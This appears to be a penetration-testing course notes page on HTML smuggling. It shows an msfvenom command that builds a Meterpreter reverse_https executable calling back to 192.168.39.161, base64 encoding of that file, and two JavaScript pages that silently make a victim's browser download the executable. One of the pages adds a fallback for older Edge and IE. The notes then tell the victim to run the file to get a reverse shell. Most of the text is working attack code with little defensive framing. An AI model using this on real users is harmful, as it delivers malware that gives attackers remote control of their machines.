# HTML Smuggling

### Start our apache 2

```jsx
sudo service apache2 start
```

### Generate msfvenom payload

```jsx
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.39.161 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 760 bytes
Final size of exe file: 7680 bytes
Saved as: /var/www/html/msfstaged.exe

```

### Then we need to convert it into base64

```jsx
base64 msfstaged.exe | nonl

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAA<SNIP>
```

Note that we chose to browse to the HTML file with Google Chrome since it supports _window.URL.createObjectURL_. This technique must be modified to work against browsers like Internet Explorer and Microsoft Edge.

![Figure 1: Meterpreter executable is downloaded through HTML smuggling](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-300/imgs/csceo/Z_SQTDrlX1g-csceo_smuggle.png)

```jsx
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
    		  var binary_string = window.atob(base64);
    		  var len = binary_string.length;
    		  var bytes = new Uint8Array( len );
    		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    		  return bytes.buffer;
      		}
      		
      		var file ='TVqQAA<SNIP Payload that we convert from above >AAAAA'
      		var data = base64ToArrayBuffer(file);
      		var blob = new Blob([data], {type: 'octet/stream'});
      		var fileName = 'msfstaged.exe';
      		
      		var a = document.createElement('a');
      		document.body.appendChild(a);
      		a.style = 'display: none';
      		var url = window.URL.createObjectURL(blob);
      		a.href = url;
      		a.download = fileName;
      		a.click();
      		window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>

```

### Then inside our window host just keep the file anyway and run it to get the reverse shell

<figure><img src="../../../.gitbook/assets/Screenshot 2026-04-24 at 10.16.52 in the morning.png" alt=""><figcaption></figcaption></figure>

HTML smuggling code that first attempts to use `window.navigator.msSaveBlob` (for Microsoft Edge / Internet Explorer fallback) and falls back to the dynamic anchor download method for modern browsers.

```jsx
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
              var binary_string = window.atob(base64);
              var len = binary_string.length;
              var bytes = new Uint8Array(len);
              for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
              return bytes.buffer;
          }
          
          var file = 'TVqQ<SNIP>AAA';
          var data = base64ToArrayBuffer(file);
          var blob = new Blob([data], {type: 'octet/stream'});
          var fileName = 'msfstaged.exe';
          
          // Check for msSaveBlob support (used in older Edge and IE)
          if (window.navigator && window.navigator.msSaveBlob) {
              window.navigator.msSaveBlob(blob, fileName);
          } else {
              // Fallback for modern browsers
              var a = document.createElement('a');
              document.body.appendChild(a);
              a.style = 'display: none';
              var url = window.URL.createObjectURL(blob);
              a.href = url;
              a.download = fileName;
              a.click();
              window.URL.revokeObjectURL(url);
          }
        </script>
    </body>
</html>

```
